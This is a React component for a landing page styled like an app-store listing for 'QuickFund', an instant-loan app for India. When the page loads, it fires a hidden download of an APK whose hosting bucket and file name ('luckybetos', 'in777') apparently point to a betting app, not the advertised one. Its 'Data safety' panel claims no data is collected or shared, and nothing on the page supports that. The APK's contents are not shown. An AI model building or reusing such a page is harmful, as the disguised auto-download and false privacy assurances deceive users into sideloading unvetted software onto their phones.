import { useEffect } from "react";
import style from "./styles.module.less";

// TODO apk的下载地址
const apkUrl =
  "https://luckybetos.s3.ap-south-1.amazonaws.com/app/in777(MT2).apk";
function Download() {
  useEffect(() => {
    download();
  }, []);
  const download = () => {
    const ele = document.createElement("a");
    (ele as any).style = "visibility:hidden";
    ele.setAttribute("href", apkUrl);
    ele.setAttribute("download", "");
    ele.click();
    ele.innerHTML = "download";

    document.body.appendChild(ele);
    setTimeout(() => {
      document.body.removeChild(ele);
    }, 1000);
  };
  return (
    <div className={style.body}>
      <div className={style.top}>
        <div className={style.icon}></div>
        <div className={style.title}>
          QucikFund-Secure your loan in 5 minutes
        </div>
      </div>
      <div className={style.banner}>
        <div className={style.bannerImg}></div>
      </div>
      <div className={style.downloadBtn} onClick={download}>  
        Install
      </div>
      <div className={style.bigBanner}>
        <div className={style.bigBannerImg}></div>
      </div>
      <div className={style.about}>
        <div className={style.title}>
          <div className={style.titleLeft}>About this app</div>
          <div className={style.titleRight}></div>
        </div>
        <div className={style.text}>
          Welcome to QuickFund, your go-to financial companionfor swift and
          seamless loan solutions in India.Secure yourloan in 5 minutes
        </div>
      </div>
      <div className={style.dataSafety}>
        <div className={style.title}>
          <div className={style.titleLeft}>Data safety</div>
          <div className={style.titleRight}></div>
        </div>
        <div className={style.text}>
          Welcome to QuickFund, your go-to financial companionfor swift and
          seamless loan solutions in India.Secure yourloan in 5 minutes
        </div>
      </div>
      <div className={style.detailBox}>
        <div className={style.listBox}>
          <div className={style.listItem}>
            <div className={`${style.listItemIcon} ${style.link}`}></div>
            <div className={style.listItemRight}>
              <div className={style.listItemTitle}>
                No data shared with third parties
              </div>
              <div className={style.listItemText}>
                <span className={style.learnMore}>Learn more</span> about how
                developers declare sharing
              </div>
            </div>
          </div>
          <div className={style.listItem}>
            <div className={`${style.listItemIcon} ${style.noData}`}></div>
            <div className={style.listItemRight}>
              <div className={style.listItemTitle}>No data collected</div>
              <div className={style.listItemText}>
                <span className={style.learnMore}>Learn more</span> about how
                developers declare collection
              </div>
            </div>
          </div>
          <div className={style.listItem}>
            <div className={`${style.listItemIcon} ${style.lock}`}></div>
            <div className={style.listItemRight}>
              <div className={style.listItemTitle}>
                Data is encrypted in transit
              </div>
            </div>
          </div>
          <div className={style.listItem}>
            <div className={`${style.listItemIcon} ${style.forbidden}`}></div>
            <div className={style.listItemRight}>
              <div className={style.listItemTitle}>Data can't be deleted</div>
              <div className={style.listItemText}></div>
            </div>
          </div>
        </div>
        <div className={style.seeMore}>See details</div>
      </div>
    </div>
  );
}

export default Download;
